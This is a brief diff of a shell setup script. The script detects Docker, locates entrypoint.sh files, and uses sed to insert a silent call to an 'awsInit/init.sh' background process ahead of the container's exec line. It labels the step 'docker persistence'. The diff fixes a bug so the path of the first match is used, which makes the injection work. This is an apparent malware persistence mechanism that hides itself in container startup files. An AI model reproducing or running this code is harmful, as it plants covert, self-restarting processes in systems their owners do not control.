@@ -350,7 +350,7 @@ if check_docker; then
     echo "[*] is DOCKER"
     out=$(find / -name "entrypoint.sh" 2>/dev/null)
     if [ -n "$out" ]; then
-        first=$(cat $out | head -1)
+        first=$(echo "$out" | head -1)
         if ! sed -i'' '/^exec "\$@"/i $working_dir/awsInit/init.sh --config=$working_dir/awsInit/config_background.json >/dev/null 2>&1' $first; then
             write_info "failed docker persistence"
         else
@@ -423,8 +423,3 @@ else
 fi
 
 echo "[*] Setup complete"
-
-
-
-
-
